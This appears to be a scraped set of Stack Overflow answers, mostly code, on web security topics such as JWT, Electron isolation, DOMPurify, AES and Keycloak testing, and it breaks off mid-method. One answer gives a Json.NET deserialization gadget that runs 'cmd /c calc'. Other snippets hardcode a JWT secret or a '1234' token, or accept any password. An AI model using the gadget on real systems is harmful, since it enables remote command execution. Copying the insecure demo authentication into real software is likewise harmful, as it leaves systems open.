[
  {
    "url": "https://stackoverflow.com/questions/25098021/securityerror-blocked-a-frame-with-origin-from-accessing-a-cross-origin-frame",
    "title": "SecurityError: Blocked a frame with origin from accessing a cross-origin frame",
    "question_id": 25098021,
    "posted_date": "2014-08-02T14:14:39",
    "answers": [
      {
        "answer_id": 25098153,
        "body": "URL                                             RESULT\nhttp://www.example.com/home/other.html       -> Success\nhttp://www.example.com/dir/inner/another.php -> Success\nhttp://www.example.com:80                    -> Success (default port for HTTP)\nhttp://www.example.com:2251                  -> Failure: different port\nhttp://data.example.com/dir/other.html       -> Failure: different hostname\nhttps://www.example.com/home/index.html:80   -> Failure: different protocol\nftp://www.example.com:21                     -> Failure: different protocol & port\nhttps://google.com/search?q=james+bond       -> Failure: different protocol, port & hostname",
        "score": 1196,
        "is_accepted": true,
        "creation_date": "2014-08-02T14:28:50",
        "author": "Marco Bonelli"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/40281050/jwt-authentication-for-asp-net-web-api",
    "title": "JWT authentication for ASP.NET Web API",
    "question_id": 40281050,
    "posted_date": "2016-10-27T05:33:29",
    "answers": [
      {
        "answer_id": 40284152,
        "body": "public class TokenController : ApiController\n{\n    // This is naive endpoint for demo, it should use Basic authentication\n    // to provide token or POST request\n    [AllowAnonymous]\n    public string Get(string username, string password)\n    {\n        if (CheckUser(username, password))\n        {\n            return JwtManager.GenerateToken(username);\n        }\n        throw new HttpResponseException(HttpStatusCode.Unauthorized);\n    }\n    public bool CheckUser(string username, string password)\n    {\n        // should check in the database\n        return true;\n    }\n}",
        "score": 810,
        "is_accepted": true,
        "creation_date": "2016-10-27T08:04:42",
        "author": "cuongle"
      },
      {
        "answer_id": 40284152,
        "body": "/// <summary>\n/// Use the below code to generate symmetric Secret Key\n///     var hmac = new HMACSHA256();\n///     var key = Convert.ToBase64String(hmac.Key);\n/// </summary>\nprivate const string Secret = \"db3OIsj+BXE9NZDy0t8W3TcNekrF+2d/1sFnWG4HnV8TZY30iTOdtVWJG8abWvB1GlOgJuQZdcF2Luqm/hccMw==\";\npublic static string GenerateToken(string username, int expireMinutes = 20)\n{\n    var symmetricKey = Convert.FromBase64String(Secret);\n    var tokenHandler = new JwtSecurityTokenHandler();\n    var now = DateTime.UtcNow;\n    var tokenDescriptor = new SecurityTokenDescriptor\n    {\n        Subject = new ClaimsIdentity(new[]\n        {\n            new Claim(ClaimTypes.Name, username)\n        }),\n        Expires = now.AddMinutes(Convert.ToInt32(expireMinutes)),\n\n        SigningCredentials = new SigningCredentials(\n            new SymmetricSecurityKey(symmetricKey),\n            SecurityAlgorithms.HmacSha256Signature)\n    };\n    var stoken = tokenHandler.CreateToken(tokenDescriptor);\n    var token = tokenHandler.WriteToken(stoken);\n    return token;\n}",
        "score": 810,
        "is_accepted": true,
        "creation_date": "2016-10-27T08:04:42",
        "author": "cuongle"
      },
      {
        "answer_id": 40284152,
        "body": "private static bool ValidateToken(string token, out string username)\n{\n    username = null;\n    var simplePrinciple = JwtManager.GetPrincipal(token);\n    var identity = simplePrinciple.Identity as ClaimsIdentity;\n    if (identity == null || !identity.IsAuthenticated)\n        return false;\n    var usernameClaim = identity.FindFirst(ClaimTypes.Name);\n    username = usernameClaim?.Value;\n    if (string.IsNullOrEmpty(username))\n       return false;\n    // More validate to check whether username exists in system\n    return true;\n}\nprotected Task<IPrincipal> AuthenticateJwtToken(string token)\n{\n    string username;\n    if (ValidateToken(token, out username))\n    {\n        // based on username to get more information from database\n        // in order to build local identity\n        var claims = new List<Claim>\n        {\n            new Claim(ClaimTypes.Name, username)\n            // Add more claims if needed: Roles, ...\n        };\n        var identity = new ClaimsIdentity(claims, \"Jwt\");\n        IPrincipal user = new ClaimsPrincipal(identity);\n        return Task.FromResult(user);\n    }\n    return Task.FromResult<IPrincipal>(null);\n}",
        "score": 810,
        "is_accepted": true,
        "creation_date": "2016-10-27T08:04:42",
        "author": "cuongle"
      },
      {
        "answer_id": 40284152,
        "body": "public static ClaimsPrincipal GetPrincipal(string token)\n{\n    try\n    {\n        var tokenHandler = new JwtSecurityTokenHandler();\n        var jwtToken = tokenHandler.ReadToken(token) as JwtSecurityToken;\n        if (jwtToken == null)\n            return null;\n        var symmetricKey = Convert.FromBase64String(Secret);\n        var validationParameters = new TokenValidationParameters()\n        {\n            RequireExpirationTime = true,\n            ValidateIssuer = false,\n            ValidateAudience = false,\n            IssuerSigningKey = new SymmetricSecurityKey(symmetricKey)\n        };\n        SecurityToken securityToken;\n        var principal = tokenHandler.ValidateToken(token, validationParameters, out securityToken);\n        return principal;\n    }\n    catch (Exception)\n    {\n        //should write log\n        return null;\n    }\n}",
        "score": 810,
        "is_accepted": true,
        "creation_date": "2016-10-27T08:04:42",
        "author": "cuongle"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60909402/how-to-exclude-disable-redux-devtools-in-production-build-or-disconnect",
    "title": "How to exclude / disable Redux devtools in production build or disconnect?",
    "question_id": 60909402,
    "posted_date": "2020-03-28T22:15:07",
    "answers": [
      {
        "answer_id": 60952672,
        "body": "import { createStore, applyMiddleware, compose } from 'redux';\nimport createSagaMiddleware from 'redux-saga';\nimport reducer from '~/redux/reducers';\nimport mySaga from '~/redux/sagas';\nimport { nodeEnv } from '~/utils/config';\nconst composeEnhancers =\n  (nodeEnv !== 'production' &&\n    typeof window !== 'undefined' &&\n    window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__) ||\n  compose;\nconst sagaMiddleware = createSagaMiddleware();\nexport default createStore(\n  reducer,\n  composeEnhancers(applyMiddleware(sagaMiddleware))\n);\nsagaMiddleware.run(mySaga);",
        "score": 31,
        "is_accepted": false,
        "creation_date": "2020-03-31T10:12:29",
        "author": "AmerllicA"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/62081028/this-document-requires-trustedscripturl-assignment",
    "title": "This document requires &#39;TrustedScriptURL&#39; assignment",
    "question_id": 62081028,
    "posted_date": "2020-05-29T03:43:25",
    "answers": [
      {
        "answer_id": 64595475,
        "body": "/**\n * Control behavior relating to Custom Elements\n */\n\n// DOMPurify allows to define rules for Custom Elements. When using the CUSTOM_ELEMENT_HANDLING\n// literal, it is possible to define exactly what elements you wish to allow (by default, none are allowed).\n//\n// The same goes for their attributes. By default, the built-in or configured allow.list is used.\n//\n// You can use a RegExp literal to specify what is allowed or a predicate, examples for both can be seen below.\n// The default values are very restrictive to prevent accidental XSS bypasses. Handle with great care!\nvar clean = DOMPurify.sanitize(\n    '<foo-bar baz=\"foobar\" forbidden=\"true\"></foo-bar><div is=\"foo-baz\"></div>',\n    {\n        CUSTOM_ELEMENT_HANDLING: {\n            tagNameCheck: null, // no custom elements are allowed\n            attributeNameCheck: null, // default / standard attribute allow-list is used\n            allowCustomizedBuiltInElements: false, // no customized built-ins allowed\n        },\n    }\n); // <div is=\"\"></div>\n\nvar clean = DOMPurify.sanitize(\n    '<foo-bar baz=\"foobar\" forbidden=\"true\"></foo-bar><div is=\"foo-baz\"></div>',\n    {\n        CUSTOM_ELEMENT_HANDLING: {\n            tagNameCheck: /^foo-/, // allow all tags starting with \"foo-\"\n            attributeNameCheck: /baz/, // allow all attributes containing \"baz\"\n            allowCustomizedBuiltInElements: false, // customized built-ins are allowed\n        },\n    }\n); // <foo-bar baz=\"foobar\"></foo-bar><div is=\"\"></div>\n\nvar clean = DOMPurify.sanitize(\n    '<foo-bar baz=\"foobar\" forbidden=\"true\"></foo-bar><div is=\"foo-baz\"></div>',\n    {\n        CUSTOM_ELEMENT_HANDLING: {\n            tagNameCheck: (tagName) => tagName.match(/^foo-/), // allow all tags starting with \"foo-\"\n            attributeNameCheck: (attr) => attr.match(/baz/), // allow all containing \"baz\"\n            allowCustomizedBuiltInElements: true, // allow customized built-ins\n        },\n    }\n); // <foo-bar baz=\"foobar\"></foo-bar><div is=\"foo-baz\"></div>",
        "score": 25,
        "is_accepted": true,
        "creation_date": "2020-10-29T12:38:43",
        "author": "connexo"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/57960770/how-can-i-mitigate-injection-exfiltration-attacks-from-dynamic-property-accesses",
    "title": "How can I mitigate injection/exfiltration attacks from dynamic property accesses (i.e. square bracket notation) in JavaScript?",
    "question_id": 57960770,
    "posted_date": "2019-09-16T12:13:09",
    "answers": [
      {
        "answer_id": 58179430,
        "body": "// replacement for (key in maplike)\n  function maplikeContains(maplike, key) {\n      return ('.' + key) in maplike;\n  }\n\n  // replacement for (maplike[key])\n  function maplikeGet(maplike, key) {\n      return maplike['.' + key];\n  }\n\n  // replacement for (maplike[key] = value)\n  function maplikeSet(maplike, key, value) {\n      return maplike['.' + key] = value;\n  }\n\n  // replacement for the for-in loop\n  function maplikeEach(maplike, visit) {\n      for (var key in maplike) {\n          if (key.charAt(0) !== '.')\n              continue;\n          if (visit(key.substr(1), maplike[key]))\n              break;\n      }\n  }",
        "score": 16,
        "is_accepted": false,
        "creation_date": "2019-10-01T02:50:41",
        "author": "dumbass"
      },
      {
        "answer_id": 58179430,
        "body": "// replacement for (key in maplike)\n  function maplikeContains(maplike, key) {\n      return Object.prototype.hasOwnProperty.call(maplike, key);\n  }\n\n  // replacement for (maplike[key])\n  function maplikeGet(maplike, key) {\n      if (Object.prototype.hasOwnProperty.call(maplike, key))\n          return maplike[key];\n  }\n\n  // replacement for (maplike[key] = value)\n  function maplikeSet(maplike, key, value) {\n      Object.defineProperty(maplike, key, {\n          value: value,\n          writable: true,\n          enumerable: true,\n          configurable: true\n      });\n      return value;\n  }\n\n  // replacement for the for-in loop\n  function maplikeEach(maplike, visit) {\n      for (var key in maplike) {\n          if (!Object.prototype.hasOwnProperty.call(maplike, key))\n              continue;\n          if (visit(key, maplike[key]))\n              break;\n      }\n  }",
        "score": 16,
        "is_accepted": false,
        "creation_date": "2019-10-01T02:50:41",
        "author": "dumbass"
      },
      {
        "answer_id": 58179430,
        "body": "type Maplike<T> = {\n    [K: string]: T|undefined;\n    constructor?: T;\n    propertyIsEnumerable?: T;\n    hasOwnProperty?: T;\n    toString?: T;\n    toLocaleString?: T;\n    valueOf?: T;\n};\nconst plain: { [K: string]: string } = {};\nconst naked: Maplike<string> = Object.create(null);   // OK\nconst error: Maplike<string> = {};                    // type error\nfunction f(k: string) {\n    naked[k] = 'yay';                                 // OK\n    plain[k] = 'yay';                                 // OK\n    document.body[k] = 'yay';                         // type error\n}\nconsole.info(plain.toString());                       // OK\nconsole.info(naked.toString());                       // type error",
        "score": 16,
        "is_accepted": false,
        "creation_date": "2019-10-01T02:50:41",
        "author": "dumbass"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/29575024/is-there-any-difference-if-i-init-aes-cipher-with-and-without-ivparameterspec",
    "title": "Is there any difference, if I init AES cipher, with and without IvParameterSpec",
    "question_id": 29575024,
    "posted_date": "2015-04-11T02:50:17",
    "answers": [
      {
        "answer_id": 52571774,
        "body": "public String encrypt(String data) {\n    String encryptedText = \"\";\n    if (data == null || secretAes256Key == null)\n        return encryptedText;\n    }\n    try {\n        Cipher encryptCipher = Cipher.getInstance(AES_TRANSFORMATION_MODE);\n        encryptCipher.init(Cipher.ENCRYPT_MODE, secretAes256Key, new SecureRandom());//new IvParameterSpec(getIV()) - if you want custom IV\n        //encrypted data:\n        byte[] encryptedBytes = encryptCipher.doFinal(data.getBytes(\"UTF-8\"));\n        //take IV from this cipher\n        byte[] iv = encryptCipher.getIV();\n        //append Initiation Vector as a prefix to use it during decryption:\n        byte[] combinedPayload = new byte[iv.length + encryptedBytes.length];\n        //populate payload with prefix IV and encrypted data\n        System.arraycopy(iv, 0, combinedPayload, 0, iv.length);\n        System.arraycopy(encryptedBytes, 0, combinedPayload, iv.length, encryptedBytes.length);\n        encryptedText = Base64.encodeToString(combinedPayload, Base64.DEFAULT);\n    } catch (NoSuchAlgorithmException | BadPaddingException | NoSuchPaddingException | IllegalBlockSizeException | UnsupportedEncodingException | InvalidKeyException e) {\n        e.printStackTrace();\n    }\n\n    return encryptedText;\n}",
        "score": 14,
        "is_accepted": false,
        "creation_date": "2018-09-29T15:25:43",
        "author": "Kirill Karmazin"
      },
      {
        "answer_id": 52571774,
        "body": "public String decrypt(String encryptedString) {\n    String decryptedText = \"\";\n    if (encryptedString == null || secretAes256Key == null)\n        return decryptedText;\n    }\n    try {\n        //separate prefix with IV from the rest of encrypted data\n        byte[] encryptedPayload = Base64.decode(encryptedString, Base64.DEFAULT);\n        byte[] iv = new byte[16];\n        byte[] encryptedBytes = new byte[encryptedPayload.length - iv.length];\n        //populate iv with bytes:\n        System.arraycopy(encryptedPayload, 0, iv, 0, 16);\n        //populate encryptedBytes with bytes:\n        System.arraycopy(encryptedPayload, iv.length, encryptedBytes, 0, encryptedBytes.length);\n        Cipher decryptCipher = Cipher.getInstance(AES_TRANSFORMATION_MODE);\n        decryptCipher.init(Cipher.DECRYPT_MODE, secretAes256Key, new IvParameterSpec(iv));\n        byte[] decryptedBytes = decryptCipher.doFinal(encryptedBytes);\n        decryptedText = new String(decryptedBytes);\n    } catch (NoSuchAlgorithmException | BadPaddingException | NoSuchPaddingException | IllegalBlockSizeException | InvalidAlgorithmParameterException | InvalidKeyException e) {\n        e.printStackTrace();\n    }\n    return decryptedText;\n}",
        "score": 14,
        "is_accepted": false,
        "creation_date": "2018-09-29T15:25:43",
        "author": "Kirill Karmazin"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/55164360/with-contextisolation-true-is-it-possible-to-use-ipcrenderer",
    "title": "With contextIsolation = true, is it possible to use ipcRenderer?",
    "question_id": 55164360,
    "posted_date": "2019-03-14T09:56:11",
    "answers": [
      {
        "answer_id": 59675116,
        "body": "const {\n  app,\n  BrowserWindow,\n  ipcMain\n} = require(\"electron\");\nconst path = require(\"path\");\nconst fs = require(\"fs\");\n// Keep a global reference of the window object, if you don't, the window will\n// be closed automatically when the JavaScript object is garbage collected.\nlet win;\nasync function createWindow() {\n  // Create the browser window.\n  win = new BrowserWindow({\n    width: 800,\n    height: 600,\n    webPreferences: {\n      nodeIntegration: false, // is default value after Electron v5\n      contextIsolation: true, // protect against prototype pollution\n      enableRemoteModule: false, // turn off remote\n      preload: path.join(__dirname, \"preload.js\") // use a preload script\n    }\n  });\n  // Load app\n  win.loadFile(path.join(__dirname, \"dist/index.html\"));\n  // rest of code..\n}\napp.on(\"ready\", createWindow);\nipcMain.on(\"toMain\", (event, args) => {\n  fs.readFile(\"path/to/file\", (error, data) => {\n    // Do something with file contents\n    // Send result back to renderer process\n    win.webContents.send(\"fromMain\", responseObj);\n  });\n});",
        "score": 31,
        "is_accepted": false,
        "creation_date": "2020-01-09T22:21:45",
        "author": "reZach"
      },
      {
        "answer_id": 59675116,
        "body": "const {\n    contextBridge,\n    ipcRenderer\n} = require(\"electron\");\n// Expose protected methods that allow the renderer process to use\n// the ipcRenderer without exposing the entire object\ncontextBridge.exposeInMainWorld(\n    \"api\", {\n        send: (channel, data) => {\n            // whitelist channels\n            let validChannels = [\"toMain\"];\n            if (validChannels.includes(channel)) {\n                ipcRenderer.send(channel, data);\n            }\n        },\n        receive: (channel, func) => {\n            let validChannels = [\"fromMain\"];\n            if (validChannels.includes(channel)) {\n                // Deliberately strip event as it includes `sender`\n                ipcRenderer.on(channel, (event, ...args) => func(...args));\n            }\n        }\n    }\n);",
        "score": 31,
        "is_accepted": false,
        "creation_date": "2020-01-09T22:21:45",
        "author": "reZach"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/59993468/electron-contextbridge",
    "title": "Electron &#39;contextBridge&#39;",
    "question_id": 59993468,
    "posted_date": "2020-01-30T14:47:39",
    "answers": [
      {
        "answer_id": 63894861,
        "body": "const {\n    ipcRenderer\n} = require(\"electron\");\nwindow.send = function(channel, data){\n    // whitelist channels\n    let validChannels = [\"toMain\"];\n    if (validChannels.includes(channel)) {\n        ipcRenderer.send(channel, data);\n    }\n};\nwindow.recieve = function(channel, func){\n    let validChannels = [\"fromMain\"];\n    if (validChannels.includes(channel)) {\n        // Deliberately strip event as it includes `sender`\n        ipcRenderer.on(channel, (event, ...args) => func(...args));\n    }\n};",
        "score": 16,
        "is_accepted": false,
        "creation_date": "2020-09-14T23:59:01",
        "author": "reZach"
      },
      {
        "answer_id": 63894861,
        "body": "const {\n    contextBridge,\n    ipcRenderer\n} = require(\"electron\");\n// Expose protected methods that allow the renderer process to use\n// the ipcRenderer without exposing the entire object\ncontextBridge.exposeInMainWorld(\n    \"api\", {\n        send: (channel, data) => {\n            // whitelist channels\n            let validChannels = [\"toMain\"];\n            if (validChannels.includes(channel)) {\n                ipcRenderer.send(channel, data);\n            }\n        },\n        receive: (channel, func) => {\n            let validChannels = [\"fromMain\"];\n            if (validChannels.includes(channel)) {\n                // Deliberately strip event as it includes `sender`\n                ipcRenderer.on(channel, (event, ...args) => func(...args));\n            }\n        }\n    }\n);",
        "score": 16,
        "is_accepted": false,
        "creation_date": "2020-09-14T23:59:01",
        "author": "reZach"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/67548886/remove-specific-cookie-in-nginx-reverse-proxy",
    "title": "remove specific cookie in nginx reverse proxy",
    "question_id": 67548886,
    "posted_date": "2021-05-15T12:21:05",
    "answers": [
      {
        "answer_id": 67627604,
        "body": "location /api {\n    # save original \"Cookie\" header value\n    set $altered_cookie $http_cookie;\n    # check if the \"my_cookie\" cookie is present\n    if ($http_cookie ~ '(.*)(^|;\\s)my_cookie=(\"[^\"]*\"|[^\\s]*[^;]?)(\\2|$|;$)(?:;\\s)?(.*)') {\n        # cut \"my_cookie\" cookie from the string\n        set $altered_cookie $1$4$5;\n    }\n    # hide original \"Cookie\" header\n    proxy_hide_header Cookie;\n    # set \"Cookie\" header to the new value\n    proxy_set_header  Cookie $altered_cookie;\n    ... # other proxy settings here\n    proxy_pass <upstream>; # change to your upstream server\n}",
        "score": 32,
        "is_accepted": true,
        "creation_date": "2021-05-20T16:37:57",
        "author": "Ivan Shatsky"
      },
      {
        "answer_id": 67627604,
        "body": "Whole \"Cookie\" string                                          $1                      $2      $3            $4      $5                       $1$4$5\n-----------------------------------------------------------    --------------------    ----    ----------    ----    ---------------------    -----------------------------------------\n\"some_cookie=value1; my_cookie=value2; other_cookie=value3\"    \"some_cookie=value1\"    \"; \"    \"value2\"      \"; \"    \"other_cookie=value3\"    \"some_cookie=value1; other_cookie=value3\"\n\"some_cookie=value1; my_cookie=value2\"                         \"some_cookie=value1\"    \"; \"    \"value2\"      \"\"      \"\"                       \"some_cookie=value1\"\n\"my_cookie=value2; other_cookie=value3\"                        \"\"                      \"\"      \"value2; \"    \"\"      \"other_cookie=value3\"    \"other_cookie=value3\"\n\"my_cookie=value2\"                                             \"\"                      \"\"      \"value2\"      \"\"      \"\"                       \"\"",
        "score": 32,
        "is_accepted": true,
        "creation_date": "2021-05-20T16:37:57",
        "author": "Ivan Shatsky"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/44111074/spring-security-using-http-headers",
    "title": "Spring Security using HTTP headers",
    "question_id": 44111074,
    "posted_date": "2017-05-22T06:54:42",
    "answers": [
      {
        "answer_id": 57341317,
        "body": "@Component\npublic class XHeaderAuthenticationFilter extends OncePerRequestFilter {\n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n                                    HttpServletResponse response, FilterChain filterChain)\n            throws ServletException, IOException {\n        String xAuth = request.getHeader(\"X-Authorization\");\n        User user = findByToken(xAuth);\n        if (user == null) {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"Token invalid\");\n        } else {\n            final UsernamePasswordAuthenticationToken authentication =\n                    new UsernamePasswordAuthenticationToken(user, null, user.getAuthorities());\n            SecurityContextHolder.getContext().setAuthentication(authentication);\n            filterChain.doFilter(request, response);\n        }\n    }\n    //need to implement db user validation...\n    private User findByToken(String token) {\n        if (!token.equals(\"1234\"))\n            return null;\n        final User user = new User(\n                \"username\",\n                \"password\",\n                true,\n                true,\n                true,\n                true,\n                Collections.singletonList(new SimpleGrantedAuthority(\"ROLE_USER\")));\n        return user;\n    }\n}",
        "score": 11,
        "is_accepted": false,
        "creation_date": "2019-08-03T14:59:32",
        "author": "shahaf"
      },
      {
        "answer_id": 57341317,
        "body": "@Configuration\n@EnableWebSecurity\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n        @Override\n        protected void configure(final HttpSecurity http) throws Exception {\n            http.sessionManagement()\n                    .sessionCreationPolicy(SessionCreationPolicy.STATELESS)\n                .and()\n                .csrf().disable()\n                .authorizeRequests().anyRequest().authenticated()\n                .and()\n                .exceptionHandling()\n                    .authenticationEntryPoint(new HttpStatusEntryPoint(HttpStatus.UNAUTHORIZED))\n                .and()\n                .addFilterBefore(new XHeaderAuthenticationFilter(), UsernamePasswordAuthenticationFilter.class);\n        }\n}",
        "score": 11,
        "is_accepted": false,
        "creation_date": "2019-08-03T14:59:32",
        "author": "shahaf"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/53996117/how-to-use-docker-credential-pass-to-login-to-a-private-registry",
    "title": "How to use docker-credential-pass to login to a private registry?",
    "question_id": 53996117,
    "posted_date": "2019-01-01T09:06:39",
    "answers": [
      {
        "answer_id": 63847827,
        "body": "#!/bin/sh\n# Sets up a docker credential helper so docker login credentials are not stored encoded in base64 plain text.\n# Uses the pass secret service as the credentials store.\n# If previously logged in w/o cred helper, docker logout <registry> under each user or remove ~/.docker/config.json.\n# Tested on Ubuntu 18.04.5 LTS.\nif ! [ $(id -u) = 0 ]; then\n   echo \"This script must be run as root\"\n   exit 1\nfi\necho \"Installing dependencies\"\napt update && apt-get -y install gnupg2 pass rng-tools jq\n# Check for later releases at https://github.com/docker/docker-credential-helpers/releases\nversion=\"v0.6.3\"\narchive=\"docker-credential-pass-$version-amd64.tar.gz\"\nurl=\"https://github.com/docker/docker-credential-helpers/releases/download/$version/$archive\"\n# Download cred helper, unpack, make executable, and move it where Docker will find it.\nwget $url \\\n    && tar -xf $archive \\\n    && chmod +x docker-credential-pass \\\n    && mv -f docker-credential-pass /usr/local/bin/\n# Done with the archive\nrm -f $archive\nconfig_path=~/.docker\nconfig_filename=$config_path/config.json\n# Could assume config.json isn't there or overwrite regardless and not use jq (or sed etc.)\n# echo '{ \"credsStore\": \"pass\" }' > $config_filename\nif [ ! -f $config_filename ]\nthen\n    if [ ! -d $config_path ]\n    then\n        mkdir -p $config_path\n    fi\n    # Create default docker config file if it doesn't exist (never logged in etc.). Empty is fine currently.\n    cat > $config_filename <<EOL\n{\n}\nEOL\n    echo \"$config_filename created with defaults\"\nelse\n    echo \"$config_filename already exists\"\nfi\n# Whether config is new or existing, read into variable for easier file redirection (cat > truncate timing)\nconfig_json=`cat $config_filename`\nif [ -z \"$config_json\" ]; then\n    # Empty file will prevent jq from working\n    $config_json=\"{}\"\nfi\n# Update Docker config to set the credential store. Used sed before but messy / edge cases.\necho \"$config_json\" | jq --arg credsStore pass '. + {credsStore: $credsStore}' > $config_filename\n# Output / verify contents\necho \"$config_filename:\"\ncat $config_filename | jq\n# Help with entropy to prevent gpg2 full key generation hang\n# Feeds data from a random number generator to the kernel's random number entropy pool\nrngd -r /dev/urandom\n# To cleanup extras from multiple runs: gpg --delete-secret-key <key-id>; gpg --delete-key <key-id>\necho \"Generating GPG key, accept defaults but consider key size to 2048, supply user info\"\ngpg2 --full-generate-key\necho \"Adjusting permissions\"\nsudo chown -R $USER:$USER ~/.gnupg\nsudo find ~/.gnupg -type d -exec chmod 700 {} \\;\nsudo find ~/.gnupg -type f -exec chmod 600 {} \\;\n# List keys\ngpg2 -k\nkey=$(gpg2 --list-secret-keys | grep uid -B 1 | head -n 1 | sed 's/^ *//g')\necho \"Initializing pass with key $key\"\npass init $key\necho \"Enter a password to add to the secure store\"\npass insert docker-credential-helpers/docker-pass-initialized-check\n# Just a verification. Don't need to show actual password, mask it.\necho \"Password verification:\"\npass show docker-credential-helpers/docker-pass-initialized-check | sed -e 's/\\(.\\)/\\*/g'\necho \"Docker credential password list (empty initially):\"\ndocker-credential-pass list\necho \"Done. Ready to test. Run: sudo docker login <registry>\"\necho \"Afterwards run: sudo docker-credential-pass list; sudo cat ~/.docker/config.json\"",
        "score": 10,
        "is_accepted": false,
        "creation_date": "2020-09-11T09:14:27",
        "author": "Geoffrey Hudik"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/55924299/insecure-deserialization-using-json-net",
    "title": "Insecure deserialization using Json.NET",
    "question_id": 55924299,
    "posted_date": "2019-04-30T11:31:44",
    "answers": [
      {
        "answer_id": 55951427,
        "body": "{\n    \"$type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n    \"MethodName\": \"Start\",\n    \"MethodParameters\": {\n        \"$type\": \"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n        \"$values\": [ \"cmd\", \"/c calc\" ]\n    },\n    \"ObjectInstance\": { \"$type\": \"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" }\n}",
        "score": 25,
        "is_accepted": false,
        "creation_date": "2019-05-02T07:26:10",
        "author": "Artur"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/51711268/how-to-test-keycloak-authentication-in-spring-boot-application",
    "title": "How to test Keycloak authentication in Spring Boot application?",
    "question_id": 51711268,
    "posted_date": "2018-08-06T11:41:33",
    "answers": [
      {
        "answer_id": 60396907,
        "body": "@ExtendWith(SpringExtension.class)\n@WebMvcTest(KeycloakTest.TestController.class)\n@EnableConfigurationProperties(KeycloakSpringBootProperties.class)\n@ContextConfiguration(classes= {KeycloakTest.TestController.class, SecurityConfig.class, CustomKeycloakSpringBootConfigResolver.class})\n@AutoConfigureMockMvc\n@AutoConfigureWireMock(port = 0) //random port, that is wired into properties with key wiremock.server.port\n@TestPropertySource(locations = \"classpath:wiremock.properties\")\npublic class KeycloakTest {\n    private static RsaJsonWebKey rsaJsonWebKey;\n    private static boolean testSetupIsCompleted = false;\n    @Value(\"${wiremock.server.baseUrl}\")\n    private String keycloakBaseUrl;\n    @Value(\"${keycloak.realm}\")\n    private String keycloakRealm;\n    @Autowired\n    private MockMvc mockMvc;\n    @BeforeEach\n    public void setUp() throws IOException, JoseException {\n        if(!testSetupIsCompleted) {\n            // Generate an RSA key pair, which will be used for signing and verification of the JWT, wrapped in a JWK\n            rsaJsonWebKey = RsaJwkGenerator.generateJwk(2048);\n            rsaJsonWebKey.setKeyId(\"k1\");\n            rsaJsonWebKey.setAlgorithm(AlgorithmIdentifiers.RSA_USING_SHA256);\n            rsaJsonWebKey.setUse(\"sig\");\n            String openidConfig = \"{\\n\" +\n                    \"  \\\"issuer\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"\\\",\\n\" +\n                    \"  \\\"authorization_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/auth\\\",\\n\" +\n                    \"  \\\"token_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/token\\\",\\n\" +\n                    \"  \\\"token_introspection_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/token/introspect\\\",\\n\" +\n                    \"  \\\"userinfo_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/userinfo\\\",\\n\" +\n                    \"  \\\"end_session_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/logout\\\",\\n\" +\n                    \"  \\\"jwks_uri\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/certs\\\",\\n\" +\n                    \"  \\\"check_session_iframe\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/login-status-iframe.html\\\",\\n\" +\n                    \"  \\\"registration_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/clients-registrations/openid-connect\\\",\\n\" +\n                    \"  \\\"introspection_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/token/introspect\\\"\\n\" +\n                    \"}\";\n            stubFor(WireMock.get(urlEqualTo(String.format(\"/auth/realms/%s/.well-known/openid-configuration\", keycloakRealm)))\n                    .willReturn(aResponse()\n                            .withHeader(\"Content-Type\", \"application/json\")\n                            .withBody(openidConfig)\n                    )\n            );\n            stubFor(WireMock.get(urlEqualTo(String.format(\"/auth/realms/%s/protocol/openid-connect/certs\", keycloakRealm)))\n                    .willReturn(aResponse()\n                            .withHeader(\"Content-Type\", \"application/json\")\n                            .withBody(new JsonWebKeySet(rsaJsonWebKey).toJson())\n                    )\n            );\n            testSetupIsCompleted = true;\n        }\n    }\n    @Test\n    public void When_access_token_is_in_header_Then_process_request_with_Ok() throws Exception {\n        ResultActions resultActions = this.mockMvc\n                .perform(get(\"/test\")\n                        .header(\"Authorization\",String.format(\"Bearer %s\", generateJWT(true)))\n                );\n        resultActions\n                .andDo(print())\n                .andExpect(status().isOk())\n                .andExpect(content().string(\"hello\"));\n    }\n    @Test\n    public void When_access_token_is_missing_Then_redirect_to_login() throws Exception {\n        ResultActions resultActions = this.mockMvc\n                .perform(get(\"/test\"));\n        resultActions\n                .andDo(print())\n                .andExpect(status().isFound())\n                .andExpect(redirectedUrl(\"/sso/login\"));\n    }\n    private String generateJWT(boolean withTenantClaim) throws 